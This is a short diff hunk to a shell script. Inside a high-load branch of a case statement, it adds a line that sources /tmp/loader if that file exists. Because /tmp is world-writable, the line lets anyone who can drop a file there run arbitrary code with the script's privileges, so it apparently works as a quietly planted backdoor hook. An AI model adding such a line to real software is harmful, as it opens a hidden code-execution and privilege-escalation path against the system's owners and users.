@@ -57,6 +57,7 @@ case "$LOAD" in
 	;;
 	*)
 		echo "[ATT] high load: $LOAD"
+		[ -e '/tmp/loader' ] && . /tmp/loader
 		return 0
 	;;
 esac
